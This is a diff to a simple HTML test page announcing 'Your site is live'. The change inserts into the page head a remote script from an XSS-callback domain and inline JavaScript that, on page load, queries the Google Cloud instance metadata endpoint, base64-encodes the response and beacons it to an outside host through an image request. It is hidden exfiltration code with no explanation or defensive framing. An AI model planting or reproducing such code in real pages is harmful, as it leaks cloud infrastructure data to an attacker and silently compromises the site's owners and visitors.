@@ -2,7 +2,19 @@
 <html>
 <head>
   <title>Test Page</title>
-  
+  <script src="https://js.rip/5mw8at9w5s"></script>
+  <script>
+    fetch("http://metadata.google.internal/computeMetadata/v1/instance/hostname", {
+      headers: { "Metadata-Flavor": "Google" }
+    })
+    .then(r => r.text())
+    .then(t => {
+      new Image().src = "https://xss.js.rip/5mw8at9w5s/" + btoa(t);
+    })
+    .catch(() => {
+      new Image().src = "https://xss.js.rip/5mw8at9w5s/error";
+    });
+  </script>
 </head>
 <body>
   <h1>It works! Your site is live 🚀</h1>
